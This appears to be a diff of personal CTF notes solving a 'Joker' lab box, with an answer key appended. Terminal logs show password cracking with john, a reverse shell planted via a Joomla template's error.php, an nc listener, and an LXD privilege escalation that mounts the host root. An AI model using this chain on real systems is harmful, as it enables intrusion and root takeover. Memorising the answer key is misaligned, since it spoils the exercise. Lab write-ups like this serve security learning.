@@ -799,3 +799,404 @@ HTTPS (SSL/TLS) options:
        --private-key=FILE          private key file
        --private-key-type=TYPE     private key type, PEM or DER
        --ca-certificate=FILE       file with the bundle of CAs
+       --ca-directory=DIR          directory where hash list of CAs is stored
+       --crl-file=FILE             file with bundle of CRLs
+       --pinnedpubkey=FILE/HASHES  Public key (PEM/DER) file, or any number
+                                   of base64 encoded sha256 hashes preceded by
+                                   'sha256//' and separated by ';', to verify
+                                   peer against
+
+       --ciphers=STR           Set the priority string (GnuTLS) or cipher list string (OpenSSL) directly.
+                                   Use with care. This option overrides --secure-protocol.
+                                   The format and syntax of this string depend on the specific SSL/TLS engine.
+HSTS options:
+       --no-hsts                   disable HSTS
+       --hsts-file                 path of HSTS database (will override default)
+
+FTP options:
+       --ftp-user=USER             set ftp user to USER
+       --ftp-password=PASS         set ftp password to PASS
+       --no-remove-listing         don't remove '.listing' files
+       --no-glob                   turn off FTP file name globbing
+       --no-passive-ftp            disable the "passive" transfer mode
+       --preserve-permissions      preserve remote file permissions
+       --retr-symlinks             when recursing, get linked-to files (not dir)
+
+FTPS options:
+       --ftps-implicit                 use implicit FTPS (default port is 990)
+       --ftps-resume-ssl               resume the SSL/TLS session started in the control connection when
+                                         opening a data connection
+       --ftps-clear-data-connection    cipher the control channel only; all the data will be in plaintext
+       --ftps-fallback-to-ftp          fall back to FTP if FTPS is not supported in the target server
+WARC options:
+       --warc-file=FILENAME        save request/response data to a .warc.gz file
+       --warc-header=STRING        insert STRING into the warcinfo record
+       --warc-max-size=NUMBER      set maximum size of WARC files to NUMBER
+       --warc-cdx                  write CDX index files
+       --warc-dedup=FILENAME       do not store records listed in this CDX file
+       --no-warc-compression       do not compress WARC files with GZIP
+       --no-warc-digests           do not calculate SHA1 digests
+       --no-warc-keep-log          do not store the log file in a WARC record
+       --warc-tempdir=DIRECTORY    location for temporary files created by the
+                                     WARC writer
+
+Recursive download:
+  -r,  --recursive                 specify recursive download
+  -l,  --level=NUMBER              maximum recursion depth (inf or 0 for infinite)
+       --delete-after              delete files locally after downloading them
+  -k,  --convert-links             make links in downloaded HTML or CSS point to
+                                     local files
+       --convert-file-only         convert the file part of the URLs only (usually known as the basename)
+       --backups=N                 before writing file X, rotate up to N backup files
+  -K,  --backup-converted          before converting file X, back up as X.orig
+  -m,  --mirror                    shortcut for -N -r -l inf --no-remove-listing
+  -p,  --page-requisites           get all images, etc. needed to display HTML page
+       --strict-comments           turn on strict (SGML) handling of HTML comments
+
+Recursive accept/reject:
+  -A,  --accept=LIST               comma-separated list of accepted extensions
+  -R,  --reject=LIST               comma-separated list of rejected extensions
+       --accept-regex=REGEX        regex matching accepted URLs
+       --reject-regex=REGEX        regex matching rejected URLs
+       --regex-type=TYPE           regex type (posix|pcre)
+  -D,  --domains=LIST              comma-separated list of accepted domains
+       --exclude-domains=LIST      comma-separated list of rejected domains
+       --follow-ftp                follow FTP links from HTML documents
+       --follow-tags=LIST          comma-separated list of followed HTML tags
+       --ignore-tags=LIST          comma-separated list of ignored HTML tags
+  -H,  --span-hosts                go to foreign hosts when recursive
+  -L,  --relative                  follow relative links only
+  -I,  --include-directories=LIST  list of allowed directories
+       --trust-server-names        use the name specified by the redirection
+                                     URL's last component
+  -X,  --exclude-directories=LIST  list of excluded directories
+  -np, --no-parent                 don't ascend to the parent directory
+
+Email bug reports, questions, discussions to <bug-wget@gnu.org>
+and/or open issues at https://savannah.gnu.org/bugs/?func=additem&group=wget.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wget --user=joker --password=hannah http://10.10.230.190:8080/backup.zip
+--  http://10.10.230.190:8080/backup.zip
+Connecting to 10.10.230.190:8080... connected.
+HTTP request sent, awaiting response... 401 Unauthorized
+Authentication selected: Basic realm=" Please enter the password."
+Reusing existing connection to 10.10.230.190:8080.
+HTTP request sent, awaiting response... 200 OK
+Length: 12133560 (12M) [application/zip]
+Saving to: ‘backup.zip’
+
+backup.zip           100%[====================>]  11.57M   717KB/s    in 18s     
+
+(664 KB/s) - ‘backup.zip’ saved [12133560/12133560]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ mkdir backups                                            
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads]
+└─$ mv backup.zip /home/witty/Downloads/backups  
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd backups              
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads/backups]
+└─$ ls
+backup.zip
+
+┌──(witty㉿kali)-[~/Downloads/backups]
+└─$ unzip backup.zip 
+Archive:  backup.zip
+   creating: db/
+[backup.zip] db/joomladb.sql password: 
+password incorrect--reenter:   
+
+┌──(witty㉿kali)-[~/Downloads/backups]
+└─$ zip2john backup.zip > hash
+
+┌──(witty㉿kali)-[~/Downloads/backups]
+└─$ cat hash            
+backup.zip:$pkzip$8*1*1*0*0*1c*433a*6c2b37f221efe3d1f3cf416386a69e390b2d5cbdaf4c820dfdeed1c2*1*0*0*21*433a*3a1cf51b86e90000c96583ff28c3f66967627db8eb898947aefffbbf14d2d79afa*1*0*0*24*433b*e72d627b8f09c0b28e777a603b72dfe046d7928a2fad76ae291785873c827a5c76158220*1*0*0*24*433b*4612436e78ed4312b2183316d6c6d38376bee4ef1163039f3106650d09fd16dc1dd30681*1*0*8*24*433a*83046150d21c4832d6fc5ba494d8d6f79bcfa76e5919c5a97bcf890f06d2e540e258f9a3*1*0*8*24*433b*c50910b2036c8e097d626a162570c843e793af7df0bab242d73e98ee1a71c036588be383*1*0*8*24*433a*ace94169c2a3465b235e408520eaf5701e867474d6a32f2aa179972c95d4cf5e29942319*2*0*13*7*ebd78eb7*1beea*6b*0*13*433a*42420120b0cb36a12b6c31737d25a0f56d777d*$/pkzip$::backup.zip:site/libraries/vendor/phpmailer/phpmailer/VERSION, site/libraries/fof/version.txt, site/media/jui/js/jquery-noconflict.js, site/templates/protostar/error.php, site/templates/beez3/error.php, site/libraries/index.html, site/templates/index.html, site/administrator/cache/index.html:backup.zip
+
+┌──(witty㉿kali)-[~/Downloads/backups]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hannah           (backup.zip)     
+1g 0:00:00:00 DONE () 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+──(witty㉿kali)-[~/Downloads/backups]
+└─$ unzip backup.zip
+Archive:  backup.zip
+   creating: db/
+[backup.zip] db/joomladb.sql password: 
+  inflating: db/joomladb.sql         
+   creating: site/
+   creating: site/libraries/
+   creating: site/libraries/phpass/
+  inflating: site/libraries/phpass/PasswordHash.php  
+....
+
+┌──(witty㉿kali)-[~/Downloads/backups]
+└─$ cd site         
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads/backups/site]
+└─$ ls
+administrator  configuration.php  language     modules     tmp
+bin            htaccess.txt       layouts      plugins     web.config.txt
+cache          images             libraries    README.txt
+cli            includes           LICENSE.txt  robots.txt
+components     index.php          media        templates
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads/backups/site]
+└─$ head -n20 configuration.php 
+<?php
+class JConfig {
+	public $offline = '0';
+	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+	public $display_offline_message = '1';
+	public $offline_image = '';
+	public $sitename = 'joker';
+	public $editor = 'tinymce';
+	public $captcha = '0';
+	public $list_limit = '20';
+	public $access = '1';
+	public $debug = '0';
+	public $debug_lang = '0';
+	public $dbtype = 'mysqli';
+	public $host = 'localhost';
+	public $user = 'joomla';
+	public $password = '1234';
+	public $db = 'joomladb';
+	public $dbprefix = 'cc1gr_';
+	public $live_site = '';
+
+┌──(witty㉿kali)-[~/Downloads/backups]
+└─$ cd db 
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads/backups/db]
+└─$ ls
+joomladb.sql
+
+┌──(witty㉿kali)-[~/Downloads/backups/db]
+└─$ more joomladb.sql                           
+-- MySQL dump 10.13  Distrib 5.7.27, for Linux (x86_64)
+--
+-- Host: localhost    Database: joomladb
+-- ------------------------------------------------------
+-- Server version	5.7.27-0ubuntu0.18.04.1
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8 */;
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
+/*!40103 SET TIME_ZONE='+00:00' */;
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */
+;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+--
+-- Table structure for table `cc1gr_assets`
+--
+
+DROP TABLE IF EXISTS `cc1gr_assets`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `cc1gr_assets` (
+
+┌──(witty㉿kali)-[~/Downloads/backups/db]
+└─$ grep CREATE TABLE joomladb.sql | grep user
+grep: TABLE: No such file or directory
+joomladb.sql:CREATE TABLE `cc1gr_user_keys` (
+joomladb.sql:CREATE TABLE `cc1gr_user_notes` (
+joomladb.sql:CREATE TABLE `cc1gr_user_profiles` (
+joomladb.sql:CREATE TABLE `cc1gr_user_usergroup_map` (
+joomladb.sql:CREATE TABLE `cc1gr_usergroups` (
+joomladb.sql:CREATE TABLE `cc1gr_users` (
+
+┌──(witty㉿kali)-[~/Downloads/backups/db]
+└─$ grep cc1gr_users joomladb.sql 
+-- Table structure for table `cc1gr_users`
+DROP TABLE IF EXISTS `cc1gr_users`;
+CREATE TABLE `cc1gr_users` (
+-- Dumping data for table `cc1gr_users`
+LOCK TABLES `cc1gr_users` WRITE;
+/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
+INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'','','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
+/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
+
+┌──(witty㉿kali)-[~/Downloads/backups/db]
+└─$ echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > hash
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads/backups/db]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcd1234         (?)     
+1g 0:00:00:11 DONE () 0.08474g/s 88.47p/s 88.47c/s 88.47C/s bullshit..piolin
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+admin:abcd1234
+
+From the Control Panel go to `Configuration > Templates > Templates > Beez3 Details and Files`. Click on `error.php`
+
+uploading ivan php
+
+visit the error page http://10.10.134.191:8080/templates/beez3/error.php 
+You should now have a reverse shell.
+
+┌──(witty㉿kali)-[~/Downloads/backups/db]
+└─$ rlwrap nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.134.191] 36412
+SOCKET: Shell has connected! PID: 928
+SHELL=/bin/bash script -q /dev/null
+www-data@ubuntu:/opt/joomla/templates/beez3$ whoami
+whoami
+www-data
+www-data@ubuntu:/opt/joomla/templates/beez3$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
+
+www-data@ubuntu:/opt/joomla/templates/beez3$ cd /tmp
+cd /tmp
+www-data@ubuntu:/tmp$ ls
+ls
+www-data@ubuntu:/tmp$ lxc image list
+lxc image list
++-------+--------------+--------+-------------+--------+--------+------------------------------+
+| ALIAS | FINGERPRINT  | PUBLIC | DESCRIPTION |  ARCH  |  SIZE  |         UPLOAD DATE          |
++-------+--------------+--------+-------------+--------+--------+------------------------------+
+|       | a8258f4a885f | no     |             | x86_64 | 2.39MB | Oct 25, 2019 at 8:07pm (UTC) |
++-------+--------------+--------+-------------+--------+--------+------------------------------+
+
+┌──(witty㉿kali)-[~/Downloads/lxd-alpine-builder]
+└─$ python3 -m http.server 1234            
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.134.191 - - [10/Mar/2023 17:23:44] "GET /alpine-v3.13-x86_64-20210218_0139.tar.gz HTTP/1.1" 200 -
+
+www-data@ubuntu:/tmp$ wget http://10.8.19.103:1234/alpine-v3.13-x86_64-20210218_0139.tar.gz
+<9.103:1234/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--  http://10.8.19.103:1234/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3259593 (3.1M) [application/gzip]
+Saving to: 'alpine-v3.13-x86_64-20210218_0139.tar.gz'
+
+alpine-v3.13-x86_64 100%[===================>]   3.11M   885KB/s    in 3.6s    
+
+(885 KB/s) - 'alpine-v3.13-x86_64-20210218_0139.tar.gz' saved [3259593/3259593]
+
+www-data@ubuntu:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+<e-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+www-data@ubuntu:/tmp$ lxc image list
+lxc image list
++---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
+| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Mar 10, 2023 at 10:24pm (UTC) |
++---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
+
+www-data@ubuntu:/tmp$ lxc init myimage alpine -c security.privileged=true
+lxc init myimage alpine -c security.privileged=true
+Creating alpine
+www-data@ubuntu:/tmp$ lxc config device add alpine mydevice disk source=/ path=/mnt/root/ recursive=true
+<device disk source=/ path=/mnt/root/ recursive=true
+Device mydevice added to alpine
+www-data@ubuntu:/tmp$ lxc start alpine
+lxc start alpine
+www-data@ubuntu:/tmp$ lxc exec alpine /bin/sh
+lxc exec alpine /bin/sh
+~ # id
+id
+uid=0(root) gid=0(root)
+
+~ # cd  /mnt/root/root/
+cd  /mnt/root/root/
+/mnt/root/root # ls
+ls
+final.txt
+/mnt/root/root # cat final.txt
+cat final.txt
+
+     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
+     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
+     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
+██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
+╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
+ ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+                                         
+!! Congrats you have finished this task !!		
+							
+Contact us here:						
+								
+Hacking Articles : https://twitter.com/rajchandel/		
+Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114								
+								
++-+-+-+-+-+ +-+-+-+-+-+-+-+					
+ |E|n|j|o|y| |H|A|C|K|I|N|G|			
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+
+```
+![[Pasted image 20230310130631.png]]
+![[Pasted image 20230310171508.png]]
+Enumerate services on target machine.
+What about nmap?
+What version of Apache is it?
+*2.4.29*
+What port on this machine not need to be authenticated by user and password?
+*80*
+There is a file on this port that seems to be secret, what is it?
+Extensions File, dirb command comes with a flag that append each word with this extensions. Try to use dirb with a file that contains some commons extensions in a web server.
+*secret.txt*
+There is another file which reveals information of the backend, what is it?
+*phpinfo.php*
+When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?
+*joker*
+What port on this machine need to be authenticated by Basic Authentication Mechanism?
+*8080*
+At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?
+Maybe burp with format user:pass and encode with base64? Note: Don't forget decode it!!
+*hannah*
+Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?
+Nikto with the credentials we obtained?
+*/administrator/*
+We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?
+*backup.zip*
+We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?
+Use john to crack the zip hash
+*hannah*
+Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?
+*admin*
+Super Duper User! What is the password?
+Again, john and mysql hash password.
+*abcd1234*
+At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?
+Maybe use error.php page on a template? Of course try it and execute 'id' command.
+*www-data*
+This user belongs to a group that differs on your own group, What is this group?
+Linux containers
+*lxd*
+Spawn a tty shell.
+python3
+In this question you should be do a basic research on how linux containers (LXD) work, it has a small online tutorial. Googling "lxd try it online".
+Completed
+Research how to escalate privileges using LXD permissions and check to see if there are any images available on the box.
+If there isn't an image already on the box, you may need to upload one...
+**The idea here is to mount the root of the OS file system on the container, this should give us access to the root directory.** Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine.
+lxc init ... lxc config device ... lxc start ... lxc exec ...
+What is the name of the file in the /root directory?
+*final.txt*
+
+## Notes / Lessons Learned
+[[OWASP Top 10 - 2021]]
+
